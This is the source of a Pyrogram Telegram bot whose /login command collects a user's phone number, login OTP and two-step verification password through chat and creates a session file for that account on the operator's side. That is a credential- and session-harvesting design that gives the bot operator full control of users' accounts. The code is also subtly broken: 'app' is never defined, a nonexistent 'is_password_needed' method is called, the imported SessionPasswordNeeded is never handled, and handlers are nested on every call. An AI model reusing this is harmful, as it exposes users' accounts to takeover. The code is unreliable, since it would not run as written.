from pyrogram import Client, filters
from pyrogram.types import KeyboardButton, ReplyKeyboardMarkup
from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid
from config import API_ID as api_id, API_HASH as api_hash
import os

# Function to generate a random name (can be omitted if not needed)
import random
import string

# Function to generate random name
def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Login function to generate session
@app.on_message(filters.command("login"))
async def generate_session(client, message):
    user_id = message.chat.id

    # Ask the user to share their contact
    contact_button = KeyboardButton("Share Contact", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)

    # Send a message asking the user to share their contact
    phone_number_msg = await message.reply(
        "Please share your contact number by clicking the button below.",
        reply_markup=reply_markup
    )

    # Wait for the user to share the contact
    @app.on_message(filters.contact & filters.user(user_id))
    async def contact_handler(_, contact_msg):
        if contact_msg.contact:
            phone_number = contact_msg.contact.phone_number
            await message.reply(f"📲 Received phone number: {phone_number}")

            try:
                await message.reply("📲 Sending OTP...")

                # Create a new Client instance for each user to handle login independently
                client_instance = Client(f"session_{user_id}", api_id, api_hash)
                await client_instance.connect()

            except Exception as e:
                await message.reply(f"❌ Failed to send OTP: {e}. Please wait and try again later.")
                return

            # Send OTP code to the phone number
            try:
                code = await client_instance.send_code(phone_number)
            except ApiIdInvalid:
                await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
                return
            except PhoneNumberInvalid:
                await message.reply('❌ Invalid phone number. Please restart the session.')
                return

            # Ask the user to enter the OTP with spaces
            await message.reply("Please enter the OTP you received in the following format: 5 6 7 3 5")

            @app.on_message(filters.text & filters.user(user_id))
            async def otp_handler(_, otp_code_msg):
                phone_code = otp_code_msg.text.replace(" ", "")  # Remove spaces
                
                # Validate OTP length (5 digits)
                if len(phone_code) != 5 or not phone_code.isdigit():
                    await otp_code_msg.reply("❌ Invalid OTP format. Please enter a 5-digit OTP in the format: 5 6 7 3 5.")
                    return

                try:
                    # Attempt to log in with the provided OTP
                    await client_instance.sign_in(phone_number, code.phone_code_hash, phone_code)
                except PhoneCodeInvalid:
                    await otp_code_msg.reply('❌ Invalid OTP. Please restart the session.')
                    return
                except PhoneCodeExpired:
                    await otp_code_msg.reply('❌ Expired OTP. Please restart the session.')
                    return

                # Check if two-step verification is enabled
                try:
                    if await client_instance.is_password_needed():
                        await otp_code_msg.reply("Your account has two-step verification enabled. Please enter your password.")
                        
                        password_response = await app.listen(user_id, filters=filters.text, timeout=300)  # 5 minutes timeout
                        password = password_response.text if password_response else None
                        
                        if not password:
                            await otp_code_msg.reply('❌ No password received. Please restart the session.')
                            return
                        
                        # Attempt to verify the password
                        try:
                            await client_instance.check_password(password)
                            await otp_code_msg.reply("✅ Login successful!")
                        except PasswordHashInvalid:
                            await otp_code_msg.reply('❌ Invalid password. Please restart the session.')
                            return
                    else:
                        # If no password is needed, just confirm the login success
                        await otp_code_msg.reply("✅ Login successful!")
                except Exception as e:
                    await otp_code_msg.reply(f"❌ Error while verifying password: {str(e)}")

                # Disconnect the client after the operation
                await client_instance.disconnect()

            return  # End the contact handler
        else:
            await message.reply("❌ No valid contact received. Please try again.")
